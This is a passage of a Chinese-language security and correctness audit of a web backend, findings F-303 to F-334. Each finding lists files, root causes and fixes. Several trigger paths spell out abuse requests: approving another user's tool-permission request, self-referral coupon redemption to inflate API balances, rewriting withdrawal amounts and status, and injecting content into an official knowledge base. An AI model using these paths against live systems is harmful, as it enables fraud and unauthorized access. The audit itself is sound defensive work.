- 触发路径：一条 enabled routine 到期 → 写盘失败（磁盘满 / Windows EBUSY / 只读挂载 / `blockedWrite`）→ `writeFileSync` 抛错 → 在 `setInterval` 回调中成为未捕获异常 → 进程退出。
- 根因：`tick()` 无 try/catch；persist 设计为抛给调用方。
- 证据：`:3308` `private tick(): void {` 无 try；`:3369-3370` `if (this.blockedWrite) throw`；`index.ts:522` `process.exit(1)`。
- 影响面：单次瞬时写盘失败即打死 API 进程；配合 F-302 命中概率翻倍。
- 建议修法：`tick` 整体 + 单条 routine 各自 try/catch；persist 失败降级为 logger.error；临时文件 + rename。
- 是否当场可修：是。

#### F-304 `POST /workspace-ai/permissions/:requestId/resolve` 缺属主校验
- 严重度：P3
- 文件与行号：`routes/workspace-ai.ts:1487-1495`；`services/workspace-ai-service.ts:2375-2381`
- 触发路径：任意登录用户对他人 `requestId` 发 `{approved:true}` → `resolve` 只认 requestId → 代他人批准工具执行。
- 根因：`listPending(userId)` 有属主过滤，`resolve` 没有；`PermissionRequest.userId` 未使用。
- 证据：`:2375-2381` 仅 `this.requests.get(requestId)` + status 判定。
- 影响面：审批属主语义被破坏；requestId（48bit 随机）经日志/截图泄露即可被代批。
- 建议修法：`resolve(requestId, userId, approved)` 内部比对 `req.userId`。
- 是否当场可修：是。

#### F-305 会话质量统计：`visit_logs` 无可用索引，三腿各扫全表且非同一快照
- 严重度：P3
- 文件与行号：`services/session-quality-stats-service.ts:117-126,224-260,274-294`；`packages/database/src/schema/visit-tracking.ts:28-29`
- 触发路径：管理员打开运维大屏 → `GET /ops-wallboard/overview` → 每 5s（每进程/副本各一份缓存）跑 3 条 `created_at` + `session_id` 聚合，两列均无索引。
- 根因：索引建在 `visit_date`/`ip,city`；`perSession()` 子查询被内联进 3 条独立 SQL；三次往返不同快照。
- 证据：`session-quality-stats-service.ts:121-125` 按 `createdAt` 过滤 + `groupBy(sessionId)`；`visit-tracking.ts:28-29` 只有 dateIdx/ipCityIdx。
- 影响面：大屏每次 3 次全表扫描；三腿不同源导致“单页会话数 > 会话数”等不可对账读数。
- 建议修法：加 `(created_at desc)` 或 `(session_id, created_at)`；三腿合并为一条 CTE 或同一 REPEATABLE READ 事务。
- 是否当场可修：是（需迁移）。

#### F-306 `/workspace-ai/agent/run` 用系统票调 LLM：无计费/配额/并发上限，上游失败记为 completed
- 严重度：P2
- 文件与行号：`services/workspace-ai-service.ts:745-775,809-813`；`utils/ai-service-fetch.ts:144-154`；`routes/workspace-ai.ts:1091-1099`；连带 `:2090-2099,2120-2123`
- 触发路径：任意登录用户循环 `POST /workspace-ai/agent/run {goal}`（或经 F-301 的 routine trigger 批量）→ `aiServiceSystemFetch('/llm/chat')` 以 `agent='system'` 出网，无用户身份、无 `ensurePointsBalance`/计费/限流；`llmResp.ok === false` 与 fetch 抛错都伪造一行 `Agent 第 N 轮思考: <goal>`，随后 `task.status='completed'`。
- 根因：一律 `getSystemAccessToken()`，userId 不透传；失败分支写伪成功文案。
- 证据：`:748` `aiServiceSystemFetch('/llm/chat')`；`:770-775` else/catch 均写伪文案；`:813` `task.status = 'completed'`；`ai-service-fetch.ts:149` 系统票。
- 影响面：任何登录用户可把平台 LLM 当免费代理（无限次、每次 60s）；任务面板长期展示伪成功。注：与 F-97 同类模式但端点/调用链不同。
- 建议修法：改 `aiServiceFetch` 透传用户身份走配额；`!ok`/超时置 `failed`；入口 per-user 限流。
- 是否当场可修：部分（状态与身份透传可当场修）。

### C 路：适配器 / 定价 / 券 / 验证码 / 邮件（F-307 ~ F-314）

#### F-307 OpenAI→Anthropic 流式适配器把并行 tool_calls 合并成同一块，参数拼成非法 JSON
- 严重度：P2
- 文件与行号：`services/anthropic-adapter.ts:441-452,515-575`（关键 `541,560-570`）；类型 `:162-167`
- 触发路径：`POST /v1/messages {stream:true, tools:[A,B]}` → 上游返回 `choices[].delta.tool_calls[].index=0/1` → 适配器只有单个 `toolUseStarted` + 单个 `blockIndex`，仅首个 tool_call 建块，后续 arguments 全追加到同块。
- 根因：忽略 `tool_calls[].index`，无 `Map<index, block>`。
- 证据：`:541` `if (tc.id && tc.function?.name && !state.toolUseStarted)`；`:560-570` 统一写 `state.blockIndex`。
- 影响面：多工具/并行工具调用时第二个工具被吞、第一个工具收到两段拼接参数（JSON 解析失败）。与 F-293 同源但机理独立（F-293 是帧未解析，本条是解析后合并）。
- 建议修法：以 `tc.index` 为键维护 `Map`，每个 index 独立 start/delta/stop。
- 是否当场可修：是。

#### F-308 阶梯定价在用量低于最低档门槛时套用最低档倍率，系统性少收费
- 严重度：P2
- 文件与行号：`services/tiered-pricing-service.ts:115-126,190-197`；`routes/admin/tiered-pricing.ts:37,41`；应用点 `services/relay-billing-service.ts:656-658`
- 触发路径：后台只建一条 `fromTokens=1_000_000, multiplier=0.5` → 任意用户当月 0 token 调用 → `findCurrentTierIndex` 未命中仍返回 0 → 倍率 0.5。
- 根因：`let idx = 0` 且循环不命中直接返回；创建校验只 `fromTokens.min(0)`，不要求存在 0 起始档。
- 证据：`:117-125`；`:190-191` `const currentTier = rules[currentIdx]!`。
- 影响面：所有 relay 计费未达门槛的低用量用户按最低档折扣；若配错高价倍率则反向多收。
- 建议修法：无命中返回 -1，`getCurrentTierMultiplier` 对 -1 返回 1；保存时校验必须存在 `fromTokens=0` 基准档。
- 是否当场可修：是。

#### F-309 `upsertPricing` 更新分支忽略 `effectiveAt` 且盲更新“最新一条”
- 严重度：P2
- 文件与行号：`services/pricing-service.ts:136-164`（set 块 `146-159`，插入分支 `180`）；`routes/pricing.ts:42-43,55-64`
- 触发路径：`POST /api/pricing/models` 带未来 `effectiveAt` → 已存在生效行走 update → `effectiveAt` 不在 `set` 中 → 新价立即生效；若命中的最新行已过期，改价返回 200 但计费永不使用。
- 根因：按 `modelId ORDER BY effectiveAt DESC LIMIT 1` 取行后原地覆盖，既不写 `effectiveAt` 也不判断行状态。
- 证据：`:146-159` set 无 `effectiveAt`；`:180` 插入分支才有；`relay-billing-service.ts:578-586` 按 `effectiveAt <= now()` 读价。
- 影响面：计划调价失效或提前生效；无法通过编辑调整生效时间。
- 建议修法：`effectiveAt` 变化时改为新增一行；或按 `(modelId, effectiveAt)` 精确更新并显式写入。
- 是否当场可修：是。

#### F-310 核销入口缺 `enabled/startsAt/applicableScope` 校验，停用券与跨业务券可核销
- 严重度：P2
- 文件与行号：`services/coupon-service.ts:465-486`；`routes/miniapp-pay-routes.ts:114-126,153-223`
- 触发路径：已领取的 relay 范围券或被停用的券 → 直接 `POST /orders/:orderNo/apply-coupon {userCouponId}`（绕过前端可用券列表）→ 核销成功。
- 根因：这三项校验只存在于预览列表，未下沉到 `redeemCoupon`；唯一调用方也不传 `context.model`，`applicableModels` 永远跳过。
- 证据：`:465-486` 仅校验归属/unused/expiresAt/applicableModels；`miniapp-pay-routes.ts:114-126` 预览侧有 enabled/startsAt/scope。
- 影响面：运营“停用”对已领取券无效；relay 券可抵扣 VIP/课程订单（跨业务补贴）。
- 建议修法：抽出 `assertCouponUsable(coupon, context)` 供预览与核销共用。
- 是否当场可修：是。

#### F-311 裂变券未校验“分享人≠领取人”，可自推荐刷 API Key 余额
- 严重度：P2
- 文件与行号：`services/coupon-service.ts:188-199,343-361`（加余额在 `358`）；入口 `routes/developer-relay.ts:146,808`；`packages/database/src/schema/coupons.ts:94-112`
- 触发路径：用户 A 正常领 1 张得 userCoupon X → 对同一券码 `POST /developer/relay/coupons/redeem {code, referrerUserCouponId:X}` → `referrerUserId === A` → `referrerGets='credit'` 时余额 +`referralValue`，可重复（perUserLimit=0 时无限）。
- 根因：`referrerCoupon` 只校验 `couponId` 相同，未校验 `referrerCoupon.userId !== userId`；`referredBy` 无唯一约束；credit 直接加 `costBalanceCents` 且不写流水。
- 证据：`:196-198` `referrerUserId = referrerCoupon.userId` 无自比校验；`:354-360` 直接 update 余额；schema 仅普通索引。
- 影响面：免费刷 API Key 余额（每次=referralValue），无充值流水可对账；裂变统计可刷。
- 建议修法：拒绝自荐；同一 `referrerUserCouponId` 每人/全局限一次并加唯一约束；credit 走余额流水。
- 是否当场可修：是。

#### F-312 登录异常通知先写去重键再发送，通道全失败即丢失 6 小时安全告警
- 严重度：P3
- 文件与行号：`services/login-anomaly-notifier.ts:128-157`（`markNotified` 在 `135`，发送在 `150-157`）
- 触发路径：判定异常 → `notifyLoginAnomaly` → DB/邮件/Webhook/SMS 全失败 → 去重键已落 Redis/内存 6h → 期间不再重试。
- 根因：`markNotified` 在发送前无条件写入；`Promise.allSettled` 结果被丢弃。
- 证据：`await markNotified(userId, eventHash)` 先于 `Promise.allSettled([...])`；`memNotified` 仅内存 Map 无上限。
- 影响面：账号被盗/撞库告警在基础设施抖动时静默丢失；内存 Map 按 userId+ip 无限增长。
- 建议修法：先发送，至少一个通道成功才 markNotified；全失败降级短 TTL 重试；memNotified 加 LRU。
- 是否当场可修：是。

#### F-313 验证码服务 Redis 故障时“写内存、读 Redis”，challenge/token 必然校验失败
- 严重度：P2
- 文件与行号：`services/captcha-service.ts:292-316,318-335,349-362,206-224`（限流 fail-open `284-287`）
- 触发路径：Redis 单条命令报错/超时 → `generateChallenge` 成功返回 id（写内存）→ `verifyChallenge` 的 `loadChallenge` 只查 Redis 异常返回 null → 一律 `challenge-not-found-or-expired`；`issueToken`/`verifyToken` 同理。
- 根因：写有内存兜底，读/删/消费无。
- 证据：`storeChallenge` catch 写 `setWithLRU(memChallenges,...)`；`loadChallenge` catch `return null`；`issueToken` catch 写 memTokens，`verifyToken` catch `return false`。
- 影响面：Redis 抖动期间验证码/一次性 token 全失效，登录/注册/改密被锁死；限流异常 fail-open。
- 建议修法：读写统一降级，或 Redis 异常抛可识别错误；限流 fail-closed 或单独告警。
- 是否当场可修：是。

#### F-314 邮件发送无显式超时（Resend fetch / nodemailer），登录请求可被上游拖住数分钟
- 严重度：P3
- 文件与行号：`services/email-service.ts:375-380,423-437`；直接 await 调用方 `routes/auth.ts:1390-1397`
- 触发路径：`POST /auth/email/send-code` → `await sendVerificationEmail` → Resend 黑洞或 SMTP 建连后长时间无响应。
- 根因：`fetch` 无 `AbortSignal`（依赖 undici 默认 ~300s）；`createTransport` 未设 `connectionTimeout/greetingTimeout/socketTimeout`（nodemailer 默认 600s）。
- 证据：`fetch('https://api.resend.com/emails', { method, headers, body })` 无 signal；`createTransport({host,port,secure,auth})` 无超时字段。
- 影响面：登录请求最长挂 5-10 分钟占连接；重试被 60s 频率限制挡住；SMTP 兜底在 fetch 卡住时不触发。
- 建议修法：`AbortSignal.timeout(10_000)`；nodemailer 显式超时并 `transporter.close()`；验证码改入队异步发送。
- 是否当场可修：是。

### D 路：教育账本 / 统计 / DB（F-315 ~ F-322）

#### F-315 退费审批不冲减缴费流水，`/payment-record/summary` 的总收入与已缴人数虚高
- 严重度：P2
- 文件与行号：`services/edu-ledger.ts:634-667`（头注 `636` 自述约束；`649-658` 只 update 退费表）；`routes/edu-ai-management.ts:4531-4547,4672-4677,4957-4962`
- 触发路径：审批通过一笔 2000 元退费 → `settleRefund` 置 approved 并重算 `paid_amount` → 原 `edu_payment_record` 仍 `paid` → `GET /payment-record/summary` 的 `totalIncome`/`paidStudentCount` 仍计入。
- 根因：模块头注明确“退费必须同时把关联流水推离 'paid'”，实现未做；汇总端点只有流水单口径。
- 证据：`:649-658` set 仅 status/approver/approveAt/remark；`edu-ai-management.ts:4533-4535` `SUM(amount) WHERE status='paid'`。
- 影响面：财务看板总收入永远包含已退款金额；总收入与 Σ`paid_amount` 永不相等。
- 建议修法：审批同事务把流水置 `refunded`（部分退加 `refunded_amount`），或 summary LEFT JOIN 退费表冲减；历史数据补脚本。
- 是否当场可修：是（历史数据另补）。

#### F-316 在线学费回调：流水落库与重算非同一事务，重试被前置查重短路 → `paid_amount` 永久不更新
- 严重度：P2
- 文件与行号：`services/edu-ledger.ts:503-540`（517 插入、539 重算，无事务）；`services/order-service.ts:201-208,227-248`
- 触发路径：支付回调 → `recordPayment` 插入流水成功 → `recomputeEnrollment` 抛错 → 回调 fail 释放幂等锁 → 平台重投 → `order-service.ts:203-208` 查到流水已存在直接 return → 不再重算。
- 根因：写流水与重算派生缓存是两条独立语句；幂等判重用“流水是否存在”代替“是否已重算”。
- 证据：`:517-533` insert 与 `:539` recompute 间无 `db.transaction`；`order-service.ts:208` `if (existing.length > 0) return` 无补偿。
- 影响面：钱已收到但 `paid_amount` 不增 → 学生继续显示欠费、进入催费名单；账实不符。
- 建议修法：`db.transaction` 包住 insert + recompute；或命中已有流水时补调 `recomputeEnrollment`。
- 是否当场可修：是。

#### F-317 催费文案取“全部账期最大逾期天数”，已缴清的历史账期把未到期欠费说成逾期数百天
- 严重度：P2
- 文件与行号：`services/edu-arrear-remind-service.ts:385-398,81-93,390-391`；`services/edu-ledger.ts:210,225`
- 触发路径：账期 1 已缴清（2025-12-01）、账期 2 未到期（2026-11-20）→ `dueAmount>0` 进入催费 → `overdueDays = max(所有账期)` 取到账期 1 的 340+ → 短信“已逾期 342 天未缴清”；`dueSoonCount` 被 `overdueDays===0` 短路，到期提醒漏发。
- 根因：`edu-ledger.ts:210` 对所有账期无条件算 `overdueDays`（仅 `:225` 的 `overdue` 布尔带缴费守卫）；催费侧直接取 `s.overdueDays`。
- 证据：`:210` `Math.max(0, dayDiff(today, s.dueDate) - graceDays)`；`:225` `overdue: overdueDays > 0 && netPaid < s.amountDue`；`edu-arrear-remind-service.ts:387` `Math.max(...schedules.map(s=>s.overdueDays),0)`。
- 影响面：催缴措辞错误（指向已结清账期），易引发投诉/合规争议；真正到期提醒漏发。
- 建议修法：改为 `schedules.filter(s=>s.overdue).map(...)`；`dueSoon` 同样以 `s.overdue` 为准。
- 是否当场可修：是。

#### F-318 访问来源按 referer 分组后 `LIMIT 500` 无 `ORDER BY`，totalPv 与分类桶只覆盖任意 500 组
- 严重度：P3
- 文件与行号：`services/visit-source-stats-service.ts:156-164,43-47,122-137`
- 触发路径：24h 内 distinct referer 超过 500 → PostgreSQL 返回任意 500 组 → `totalPv` 与 direct/local/internal/external 桶只统计随机子集。
- 根因：`groupBy(referer).limit(500)` 无 `orderBy(count(*) desc)`，“前 N”实为“任意 N”。
- 证据：`:163-164` 只有 `groupBy(...).limit(SOURCE_REFERER_ROW_CAP)`；`:124` `totalPv += pv`。
- 影响面：大屏来源分布失真，恰在异常流量/攻击时失真；`totalPv` 偏小。
- 建议修法：加 `.orderBy(sql\`count(*) desc\`)`，或提高 cap 并单列 others 桶。
- 是否当场可修：是。

#### F-319 `/payment-record/summary` 接受 `termId` 但只对欠费生效，收入/已缴人数仍是全库/全班历史
- 严重度：P2
- 文件与行号：`routes/edu-ai-management.ts:4526-4568`（收入 conds 仅 classId `4527-4535`；termId 只进 enrollWhere `4550-4557`）；schema `routes/edu-ai-management-schemas-extended.ts:324-327`
- 触发路径：`GET /api/edu-ai-management/payment-record/summary?termId=X` → `totalIncome`/`paidStudentCount` 是本班全部历史，`arrearsCount`/`arrearsTotal` 却是该学期。
- 根因：`edu_payment_record` 无 `term_id` 列，收入侧未 join `edu_enrollment`，而 schema 又暴露 `termId`。
- 证据：`:4527-4529` conds 仅 deletedAt + 可选 classId；`:4550-4552` 才 push termId；`:4568` 四项同批返回。
- 影响面：同一响应内部口径不一致，按学期出报表时收入虚高，与欠费不能相抵。
- 建议修法：收入侧 join `edu_enrollment` 加 termId；或删掉 schema 的 termId。
- 是否当场可修：是。

#### F-320 巡检任务后台失败完全静默且不推进 `next_run_at`，每 60 秒重跑同一任务
- 严重度：P2
- 文件与行号：`services/patrol-scheduler.ts:268-271,309-325,250-265,333-341`
- 触发路径：agent-runtime 不可用/DB 写失败使 `executePatrol` 抛异常 → catch 里 `request?.log.warn`，而 tick 传 `request = null` → 日志不落；`next_run_at` 仍 <= now → 下一 tick 再次选中同一任务。
- 根因：后台调用把唯一可观测出口置空；失败既不写 `patrol_runs(status='error')`，也不推进/退避 `next_run_at`。
- 证据：`:269` `request?.log.warn(...)`；`:324` `await executePatrol(task, null)`；`:250-265` update 在成功路径末尾。
- 影响面：故障不可观测；持续每分钟向 agent-runtime 发起失败调用（耗时+计费）；`last_run_at/last_result` 永停更。
- 建议修法：catch 用 `logger.warn`；失败写 error run 并按退避推进 `next_run_at`。
- 是否当场可修：是。

#### F-321 页面停留先按原始 label 分组再 LIMIT 12，归一后同 URL 重复、均值只覆盖某一个动态 id
- 严重度：P3
- 文件与行号：`services/page-dwell-stats-service.ts:67-93`（`82` 分组、`84` limit、`88` 归一）；消费方 `apps/web/app/(main)/admin/monitor/wallboard/page.tsx:2825`
- 触发路径：`/course/123` 与 `/course/456` 分属两行 → 归一都是 `/course/:id` → 返回两行同 `url` → 前端 `find` 只取第一行；top12 截断在归一前，动态路由挤占名额。
- 根因：`groupBy/orderBy/limit` 作用于原始 label，归一在取回后用 TS 做。
- 证据：`:82` `groupBy(LABEL_EXPR)`；`:84` `.limit(PAGE_DWELL_TOP_N)`；`:88` `normalizeVisitPath(r.label)`；消费端 `.find()`。
- 影响面：动态路由页停留时长系统性偏差，排行可能缺少真实高停留页面。
- 建议修法：SQL 内先归一（regexp_replace 数字/UUID 段）再 group/order/limit；或取回后按归一 URL 加权合并再排序截断。
- 是否当场可修：是。

#### F-322 退费可挂到别人的缴费流水：`paymentId` 与 `studentId/classId` 不做一致性校验，金额无上限
- 严重度：P2
- 文件与行号：`services/edu-ledger.ts:592-631`（`599` 取 `payment.enrollmentId`；`618-619` 用请求 studentId/classId）；schema `routes/edu-ai-management-schemas-extended.ts:403-411`
- 触发路径：`POST /api/edu-ai-management/refund-record` 带 `studentId=A, classId=A班, paymentId=B 的流水, amount=任意` → 退费行 student=A，但 `ownerEnrollmentId` 解析为 B 的报名 → `recomputeEnrollment(B)` 冲减 B 的 `paid_amount`，A 的账目不变。
- 根因：归属以 paymentId 为准却不校验交叉一致；`amount` 无 ≤ 可退余额上限。
- 证据：`:594-599` 只取 `enrollmentId`；`:601-614` 仅在无 paymentId 时按 student+class 找；`:618-619` 仍写请求值；schema `:407` `amount: z.number().int().min(0)`。
- 影响面：退费记录与冲减对象错位，B 无辜变欠费/被催缴；超额退费可把 B 已缴额清零（`Math.max(0,...)` 掩盖负值），不可逆。
- 建议修法：paymentId 存在时联查 enrollment 校验 student/class 一致；amount ≤ payment.amount − 已退合计。
- 是否当场可修：是。

### E 路：utils 基建（F-323 ~ F-328）

#### F-323 `buildSchema` 默认 200 把 `data` 写死为 `object`，数组响应被序列化成 `{"0":...}`
- 严重度：P1
- 文件与行号：`utils/swagger.ts:8-15,25-38,71`；受害路由示例 `routes/ai-vendors/proxy-extended.ts:511-527`（`GET /vendors`）、`596-617`、`719/975/1081`；`routes/ai-vendors/proxy-media.ts:112-129,243`
- 触发路径：`GET /api/ai/vendors` → `buildSchema({summary,...})` 未传 `response` → Fastify 用 `standardResponses[200]` 序列化 → `data` 被声明为 `type:'object'` → fast-json-stringify 把数组按对象 key 输出。
- 根因：`successSchema.data = { type:'object', additionalProperties:true }`，`buildSchema` 无条件套用默认 200 schema。
- 证据：`swagger.ts:13`；`:71` `response: opts.response ?? (...)`；`proxy-extended.ts:514-518` 无 response、`:526` `reply.send(success(list))`（`list` 为数组）。用仓内 `fast-json-stringify@7.0.1` 实测同一 schema 输出 `{"code":0,"message":"ok","data":{"0":{...},"1":{...}}}`。同仓 `routes/artifacts.ts:151-155` 注释已自证该机制。
- 影响面：所有“默认 schema + `success(<数组>)`”端点契约被破坏，消费方 `data.map/filter` 失败或得空数组；OpenAPI 也生成错误类型。
- 建议修法：200 schema 不声明 `data.type`（用 `{}` 或 `oneOf`），或为 200 显式声明；需扫所有 `buildSchema` 文件的 `success(` 调用。
- 是否当场可修：是。

#### F-324 连接池泄漏检测整链空转：postgres 3.4.9 无 `.state`，track/untrack 永不执行
- 严重度：P2
- 文件与行号：`db/index.ts:208-247`（`POOL_TRACK_INTERVAL_MS=30000`、`if (!internal.state) continue`）；`plugins/db-keepalive.ts:152-171,180-196`；契约 `utils/pool-leak-detector.ts:332-353`；依赖 `package.json:93`（`postgres: ^3.4.9`）
- 触发路径：API 启动 → 每 30s 采样 `internal.state.active/idle` → 恒 `undefined` → `continue`；`outstanding` 永远为空。
- 根因：postgres.js 3.4.9 的 `Object.assign(sql, {...})` 只暴露 options/parameters/types/unsafe，无 `state` 属性。
- 证据：`db/index.ts:221` 注释自承“尝试读取内部属性（兼容不同版本）”；`node_modules/.pnpm/postgres@3.4.9/.../src/index.js` 中 `state` 仅出现于 listen 返回值与 `query.state`；`packages/database/src/read-replica.ts:83-101` 仅 patch `unsafe`。
- 影响面：`scanLeaks()` 永不产出泄漏（告警死分支）；`db_pool_in_use/checked_out` 恒 0，池打满时监控看不见。
- 建议修法：改用 `client.reserve()` 包装借还或 pool acquire/release 事件；无法采样时指标标 unavailable 而非 0。
- 是否当场可修：否（需换采样机制，可先加不可用标记止损）。

#### F-325 `memoizeClose` 缓存结果而非 in-flight promise，并发调用会真正 close 两次
- 严重度：P2
- 文件与行号：`utils/shutdown-phases.ts:215-228`；并发入口 `:261-266,321-335,346`
- 触发路径：关停窗口内 `guardCreate` 的当场回收与拥有者既有清理链同时对一个迟到实例调用 `close()`（文件头 `:212-213` 明确这是设计内会发生）。
- 根因：`settled` 只在 `await original()` 之后赋值，两个调用都能在 `undefined` 时进入并各执行一次。
- 证据：`:217-228` `if (settled === undefined) { await original(); settled = {...} }`，无共享 `inflight`。
- 影响面：非幂等 `close` 执行两次（重复 `end()` 连接池、重复 stop Worker/Server、重复释放共享句柄）。
- 建议修法：`let inflight`，首次调用立刻赋值 promise，后续 `await inflight`。
- 是否当场可修：是。

#### F-326 每相超时计时器 `unref()`，挂死且无活动句柄时 `process.exit(1)` 不可达，静默退出 0
- 严重度：P3
- 文件与行号：`utils/shutdown-phases.ts:97-101`；出口 `index.ts:448-457`
- 触发路径：某相 `run()` 返回永不 settle 的 promise 且已销毁所有 socket/interval → unref 计时器不让事件循环存活 → Node 自然退出（码 0），`timedOut` 分支与相位摘要不执行。
- 根因：唯一能产出 `timedOut`/非零码的计时器被 unref，无 ref watchdog。
- 证据：`:98-100` `timer.unref()`；`index.ts:448-457` 非零退出依赖 `await runShutdownPhases(...)` 返回。
- 影响面：正是该模块要修的“静默 exit 0”形态在无句柄挂死下复现；运维看不到相位清单。
- 建议修法：该计时器不 unref，或加进程级 ref watchdog（finally 清理）。
- 是否当场可修：是。

#### F-327 `scanLeaks` 先删 `outstanding`，`forceRelease/forceReleaseAllLeaked` 对这些 connId 永远失效
- 严重度：P3
- 文件与行号：`utils/pool-leak-detector.ts:171-201`（删除在 `:189`）、`:208-217,224-241`；调用方 `plugins/db-keepalive.ts:180-196`
- 触发路径：周期 `scanLeaks()` 标记泄漏并删除记录 → 后台自动回收 `forceRelease(connId)` 查不到 → 返回 false/0。
- 根因：把“上报泄漏”和“解除跟踪”合成一步；scan 本身不接触真实连接。
- 证据：`:176-192` push 到 `leakWarnings` 后立即 `this.outstanding.delete(connId)`；`forceRelease` 仅从 `outstanding` 取。
- 影响面：自动回收接口永远拿不到泄漏项，泄漏连接不会真正释放（当前被 F-324 掩盖，修好 F-324 后立即暴露）。
- 建议修法：scan 只标记不删，或移入 `leaked` Map；`forceRelease*` 同时查两表。
- 是否当场可修：是。

#### F-328 `kill-verified` 最终杀进程命令走 PATH 裸名 `taskkill`/`kill`，与自身绝对路径纪律矛盾
- 严重度：P3
- 文件与行号：`utils/kill-verified.ts:343-345`（`bin = isWin ? 'taskkill' : 'kill'`）；对照 `:191-192` 声明“全部绝对路径”；执行 `:281-285`
- 触发路径：self-healing 端口修复/自愈杀进程 → `execFile('taskkill', ['/PID', pid, '/F'])`（POSIX 为 `execFile('kill', ...)`）；Windows 会先搜 CWD 再搜 PATH。
- 根因：身份复核用绝对路径，真正有破坏力的 kill 反而用 PATH 短名。
- 证据：`:344-345` 裸名；`:283-285` 直接 `execFile(bin, argv)`；`:191-192` 明确写下 PATH 可被顶替的安全前提。
- 影响面：若 CWD/PATH 存在可写目录且可投放同名可执行文件，可借自愈链以 API 权限执行任意命令。
- 建议修法：Windows 用 `%SystemRoot%\System32\taskkill.exe`；POSIX 直接 `process.kill(pid,'SIGKILL')`。
- 是否当场可修：是。

---

## 十六、第十二轮新增（community/other 路由 / relay 转发与健康检查 / 智能体与 registry / db 剩余 / 横切权限矩阵）

### A 路：community / other / admin 路由（F-329 ~ F-336）

#### F-329 任意登录用户可向官方知识库写入并自行置为已发布，读写均不过滤发布态
- 严重度：P2
- 文件与行号：`routes/other/knowledge-base-routes.ts:99-127,33-83,130-145`；表 `packages/database/src/schema/knowledge-base.ts:33-34`
- 触发路径：`POST /api/knowledge-base {"title":"x","isPublished":true,"status":1}` → 立即可被 `GET /api/knowledge-base` 与 `/:id` 读到。
- 根因：整族路由只继承 `other/index.ts:46-53` 的 `authenticate`，无角色校验；body 原样入库；读取侧只有分类与搜索条件。
- 证据：`:107-108` `isPublished: z.boolean().default(false)`、`status: z.number().int().default(1)`；`:115-124` 直接 insert；`:58-61`/`:133-137` where 仅分类/id。
- 影响面：官方知识库被任意用户注入并可"自审"上线；`isPublished=false` 的草稿/下线内容也出现在列表与详情，审核与下架失效。
- 建议修法：写端点加 `requireAdmin`；读取侧统一加 `isPublished=true AND status=1`，管理端另设不过滤接口。
- 是否当场可修：是。

#### F-330 圈子 `isPublished` 只作用于列表：已隐藏圈子可被详情/帖子列表读取，且任意用户可向其发帖
- 严重度：P2
- 文件与行号：`routes/community/circles.ts:142-147,441-452,509-512`；`db/community-queries.ts:35,59-62,72-79,115-119`
- 触发路径：管理员将圈子置 `isPublished=false` → 任意人 `GET /api/circles/<uuid>`、`GET /api/circles/<uuid>/posts` 仍可读；任意登录用户 `POST /api/circles/<uuid>/posts` 可向被隐藏/未加入圈子发帖。
- 根因：`findCircleById/BySlug/findCirclePosts` 只按 id/status 查；发帖 handler 只做 404 校验，无 `isPublished` 判定也无成员校验（`circleMembers` 表与成员端点均已存在）。
- 证据：列表 `findCircles` 起点 `[eq(circles.isPublished, true)]`（`:35`）；详情 `select().from(circles).where(eq(id))`（`:59-62`）；发帖 `:509-512`。
- 影响面：圈子"下架"形同虚设；未公开圈子帖子可被枚举；任意账号可向任意圈子灌帖（审核绕过 + 内容注入）。
- 建议修法：详情/列表/发帖统一加 `isPublished=true`（管理端另路）；发帖增加成员关系校验或明确"公开圈子可发"口径。
- 是否当场可修：是。

#### F-331 三个 `by-ids` 批量端点不过滤 `status`，可枚举读取审核拒绝/已删内容
- 严重度：P2
- 文件与行号：`routes/community/asks.ts:821-838,910-927,975-992`；对照同文件 `:880-886` 的可见集口径
- 触发路径：登录用户 `GET /api/asks/question/list/by-ids?ids=<uuid>`、`/answer/list/by-ids`、`/circles/dynamic/list/by-ids` → 返回体含 `status=2/3/-1` 行。
- 根因：三个 handler 均 `inArray(x.id, ids)` 裸查，无 `status=1`；同文件已写明"可见集 = status=1，软删为 -1"。
- 证据：`:833-838`、`:922-927`、`:987-992`；`ids` 只校验 `z.string().min(1)`，无数量上限与 UUID 形态校验（可触发 PG 22P02 500）。
- 影响面：被审核拒绝/管理员删除/作者软删的问答与动态可被批量读取；非法 ids 可造成 SQL 参数膨胀。
- 建议修法：三处加 `eq(status,1)`；`ids` 限 ≤50 并逐个校验 UUID。
- 是否当场可修：是。

#### F-332 圈子评论发表未过敏感词过滤（全站 UGC 唯一漏网点），且计数为非原子读改写
- 严重度：P1
- 文件与行号：`routes/community/circles.ts:806-841`；对照 `routes/community/topics.ts:110,156`、`circles.ts:513-527`
- 触发路径：登录用户 `POST /api/circles/posts/<uuid>/comment {"content":"<违规文本>"}` → 原样入库并立即出现在评论列表与公开白名单路由。
- 根因：该 handler 直接 insert，未调用 `sanitizeUgcInput`；同文件发帖与主题评论都调用了。
- 证据：`:811-817` 仅长度校验；`:826-835` 无过滤 insert；`:837-840` `replyCount: post.replyCount + 1`（非原子）；`:832-833` 的 `replyUserId` 可任意指定。
- 影响面：公开可读评论通道可发布未过滤违规内容，绕过全站合规拦截；回复计数并发失真；可伪造"被某人回复"展示。
- 建议修法：插入前 `sanitizeUgcInput('ugc.comment.create')`；`replyCount` 改 `sql\`${...} + 1\``；校验 `replyUserId` 归属。
- 是否当场可修：是。

#### F-333 管理端提现 `PUT` 无状态机守卫，可绕过审批改金额/改归属/直接置 approved
- 严重度：P2
- 文件与行号：`routes/admin-shop-routes.ts:308-314,388-408`；对照审批链路 `:424-472,474-526`
- 触发路径：管理员 `PUT /api/admin/shop/withdrawals/<id> {"user":"<任意uuid>","amount":999999,"status":"approved"}` → 一次请求把任意提现单改成已通过，且不执行冻结资金扣减。
- 根因：PUT 复用同一 body schema 覆盖 `userId/amount/method/accountInfo/status`，无"仅 pending 可改""金额不可变"约束，不在事务内处理冻结资金；`originalAmount` 未同步。
- 证据：`:396-403` 直接 `set({ userId, amount, ..., status: ... })`；`:439-445` 审批路径才有 `eq(status,pending)` 与 `:448-465` 冻结增减。
- 影响面：已审批/已打款流水可被改金额或回退待审；冻结资金不释放形成沉淀，或审批后金额与冻结额不一致，资金守恒被破坏。注：与 F-62 不同文件不同端点，且此处可改归属与金额。
- 建议修法：PUT 拆为受限 patch（仅 pending 且只改账户信息）；金额/归属不可变；状态流转只走 approve/reject；所有变更加 `eq(status,pending)` 并写操作日志。
- 是否当场可修：是。

#### F-334 旧积分兑换的"幂等"只看最近 20 条流水，判重与扣分跨两次往返
- 严重度：P3
- 文件与行号：`routes/other/member-routes.ts:123-137`；`db/gamification-queries.ts:321-341,209-222`；`services/points-service.ts:42-63`
